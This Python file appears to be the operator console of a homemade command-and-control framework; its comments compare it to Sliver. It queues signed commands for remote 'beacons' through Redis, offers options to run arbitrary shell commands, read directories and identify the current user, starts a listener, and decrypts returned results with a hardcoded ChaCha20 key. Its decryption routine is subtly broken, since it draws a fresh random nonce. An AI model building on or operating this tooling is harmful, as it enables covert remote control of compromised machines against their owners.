import base64
import subprocess
import redis
from datetime import datetime, time
import json
import cryptography.exceptions
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import binascii
import os

# Needs a function to wipe the db and make all active beacons check in again

conn = redis.StrictRedis(host='localhost', port=6379, db=0)


def clearDB():
    for key in conn.scan_iter("*"):
        conn.delete(key)


def deCrypt(key, message):
    nonce = os.urandom(12)
    chacha = ChaCha20Poly1305(key)
    print('Decrypting')
    decrypted_data = chacha.decrypt(nonce, message, b'')
    return decrypted_data


def searchUUID(uuid):
    dt = conn.hget('UUID', uuid)
    dt = dt.decode()  # Decode it from bytes
    lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
    structure = json.dumps(lastcheckin)  # Dump the dict to json
    connector = json.loads(structure)  # Load it into a new var
    name = connector["WhoAmI"]
    print(name)


while True:
    # We should change this to a help dialogue
    # If command is empty, display the help dialogue
    # Add a GetLastCommand command
    # Add an interact option so that you enter a session with a beacon
    # Sort of akin to Sliver
    # Add an await option. After a command, await the redis update, then display
    # Set command and then await for a new var to be set
    # We will set the retrieved value when it fetches a new command
    # If retrieved is 0, then don't display. If it's 1, display the result and then reset to 0
    inp = input('> ')
    if inp == '1':
        print('Commands possible: \n'
              'pwd      - get the current working directory \n'
              'gcu      - get the current user \n'
              'rc       - run a single command \n'
              'rd       - read a directory \n'
              'terminal - Enter only terminal here and the command in the following prompt \n')
        uuid = input('UUID: ')
        #while inp != "exit":  # If the input is exit, break the loop
        choice = input('Command: ')
        choice = choice.lower()
        if choice == "terminal":
            cm = input('Enter terminal command: ')
        else: cm = choice
        # I want to preserve the current last check in time
        # so dump the DB and grab that field
        dt = conn.hget('UUID', uuid)  # Get the struct
        dt = dt.decode()  # Decode it from bytes
        lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
        structure = json.dumps(lastcheckin)  # Dump the dict to json
        connector = json.loads(structure)  # Load it into a new var
        LastInteraction = connector["LastInteraction"]
        whoami = connector["WhoAmI"]
        result = connector["Result"]
        byte_inp = bytes(cm, 'utf-8')

        with open('keys/' + "test_priv" + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
            private_key = serialization.load_pem_private_key(key_file.read(), password=None)
        signature = private_key.sign(
            byte_inp,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        signature_decoded = binascii.b2a_hex(signature).decode()

        with open('keys/' + "test_pub" + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
            public_key = serialization.load_pem_public_key(key_file.read())
        try:
            public_key.verify(
                signature,
                byte_inp,
                padding.PKCS1v15(),
                hashes.SHA256()
            )
        except cryptography.exceptions.InvalidSignature as e:
            print('ERROR: Payload and/or signature files failed verification!')
            break
        print(signature_decoded)
        b = base64.b64encode(signature)
        structure = {
            "WhoAmI": f"{whoami}",
            "Signature": f"{signature_decoded}",
            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
            "Command": f"{cm}",
            "LastInteraction": f"{LastInteraction}",
            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "Result": f"{result}",
            "GotIt": "0"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
        print("Set command... \n")
        # Await the beacon retrieving the command
        # Check the db for an update value
        canWeDisplay = connector["GotIt"]
        print("Waiting for returned data... \n")
        while canWeDisplay == "0":
            # We have to refresh the DB connectors to get updated results it seems
            dt = conn.hget('UUID', uuid)  # Get the struct
            dt = dt.decode()  # Decode it from bytes
            lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
            structure = json.dumps(lastcheckin)  # Dump the dict to json
            connector = json.loads(structure)  # Load it into a new var
            canWeDisplay = connector["GotIt"]
        result = connector["Result"]
        #print(result)
        #result = base64.decode(result)
        result = bytes(result, 'utf-8')
        print(deCrypt(b"5\xd8c\x8d\xcd-\x9fR\xaa\x11\xe0\xcc\x19\x1a\xbe<\xeb\x84\xd8\x8a9\x03\x15\xcd\x08Ib\xfb_\xb5\xaa\xb0", result))

    elif inp == '2':
        uuid = input('UUID: ')
        searchUUID(uuid)
    elif inp == '3':
        clearDB()
    elif inp == "4":
        subprocess.Popen(["python3", "listener.py"])
    elif inp == "5":
        # print(conn.keys()) # UUID is the key but we want values from the key
        print(conn.hgetall('UUID'))  # We're searching by hash values here
    else:
        print('\n '
              '(1)Enter session \n '
              '(2)Search by UUID \n '
              '(3)Clear DB \n '
              '(4)Start a listener \n '
              '(5)List all \n')
